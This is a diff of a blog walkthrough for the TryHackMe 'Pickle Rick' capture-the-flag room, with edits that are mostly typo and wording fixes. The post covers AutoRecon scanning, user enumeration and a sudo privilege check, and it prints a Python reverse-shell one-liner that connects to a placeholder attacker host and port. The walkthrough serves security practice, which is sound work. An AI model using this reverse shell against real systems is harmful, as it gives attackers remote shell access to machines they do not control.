@@ -2,30 +2,30 @@
 title: "Try Hack Me - Pickle Rick Walkthrough"
 date: 2022-07-24 12:00:00
 catagories: [article,walkthrough]
-tags: [THM]
+tags: [THM, ctf, beginner]
 ---
 ![Rick being cool.](https://imgur.com/BkKtAkO.png)
 
 
 This is an old room on Try Hack Me. At the time I am writing this walkthrough it has been released for almost 4 years!
-This room is also a CTF (Capture the Flag) room which means that it is not a "Real World" experience, but it is meant to help us practice our skills.
+This room is also a CTF (Capture the Flag) room which means that it is not a "Real World" experience. Instead it is meant to help us practice our skills.
 
 # Scanning the Host
 First we will scan the host. I like to use [autorecon](https://github.com/Tib3rius/AutoRecon) by [Tib3rius](https://twitter.com/0xTib3rius) to get things started.
 
-I like to create a new folder for the room and then a command that looks like:
+I create a new folder for the room and then a command that looks like:
 ```bash
 sudo python3 /tool_repos/AutoRecon/autorecon.py <xx.xx.xx.xx> --dirbuster.threads=100 -o /path/to/box_folder && sudo chown -R <user>:<user> /path/to/box_folder
 ```
 Ok let me explain that command:
-- `sudo python3` - I use `sudo` because some of the tools autorecon uses need to be run as `root`. The problem with this is any files created are owned by `root`. (we will fix this in a second)
-- `/tool_repos/AutoRecon/autorecon.py` - I always create a directory on my kali boxes to store all the tools I `git clone` from github. (Even better if you have NFS storage your home lab, use that to mount the folder with all the tools you like, whenever you need to rebuild your kali box!)
+- `sudo python3` - I use `sudo` because some of the tools autorecon uses need to be run as `root`. The problem with this is any files created are owned by `root`. (We will fix this in a second.)
+- `/tool_repos/AutoRecon/autorecon.py` - I always create a directory on my kali boxes to store all the tools I `git clone` from github. (Even better if you have NFS storage your home lab, use that to mount the folder with all the tools you like. Then whenever you need to rebuild your kali box you mount the folder and all your tools are ready to go.)
 - `<xx.xx.xx.xx>` - This is just a placeholder for the IP of the box you are scanning.
-- `--dirbuster.threads=100` - How many dirbuster threads you want to allocate. This is important, setting this to a higher number helps your scan get done faster.
+- `--dirbuster.threads=100` - How many dirbuster threads you want to allocate. This is an important setting. A higher number of threads helps the scan get done faster.
 - `-o /path/to/box_folder` - This is the output path for the results of the scans.
-- ` && sudo chown -R <user>:<user> /path/to/box_folder` - This is some magic I add to the end of the scan.
+- `&& sudo chown -R <user>:<user> /path/to/box_folder` - This is some magic I add to the end of the scan.
     - The `&&` just means run the next command if the previous command was successful
-    - Because we used `sudo` all the files created are owned by root. this can be annoying latter on.
+    - Because we used `sudo` all the files created are owned by root. So we use `sudo` here to change ownership back to us.
     - We use a recursive `chown` to set the owenership of the files back to our 'regular' user.
     - Just replace both `<user>` spots with the name of your user.
 
@@ -107,7 +107,7 @@ We always want to know what users are on a system so let's `ls -lah /home`
 ![](/assets/images/pr_home.jpg?raw=true)
 
 We see 2 users, `ubuntu` and `rick` and rick's permissions are wide open so let's explore his home directory.
-But after I looked around for a while longer I didn't find much. I think it time to pop a shell on this box.
+But after I looked around for a while longer I didn't find much. I think it's time to pop a shell on this box.
 First let's see if we can use python3:
 
 ![](/assets/images/python_v.jpg?raw=true)
@@ -115,7 +115,7 @@ First let's see if we can use python3:
 Now that we know that python3 executes we can try to pop a shell!
 Let's try this one. DON'T FORGET TO CHAGNE YOUR HOST IP AND PORT in the command! :)  
 
-By the way, I tryied few different reverse sheels the one below may not always work, but it did here. 
+By the way, I tried few different reverse shells. The one below may not always work, but it did here. Many times you will have to experiment to discover with will work on a given box.  
 
 ```bash
 export RHOST="xx.xx.xx.xx";export RPORT=xxxx;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
@@ -133,7 +133,7 @@ So now we have a "foothold" on the box, it's time to do some privesc (priviledge
 
 I like to use [LSE](https://github.com/diego-treitos/linux-smart-enumeration) (Linux Smart Enumeration) tool when enumerating a system for possible privesc points.
 
-BUT, before we do all that we should just check to see if our user has `sudo` privleges. Which in the real world the `www-data` should never have! 
+BUT, before we do all that we should just check to see if our user has `sudo` privleges. Which in the real world the `www-data` user should never have! 
 So we try `sudo -l` which should tell us what privleges the user has. 
 
 ![](/assets/images/pr_root.jpg)
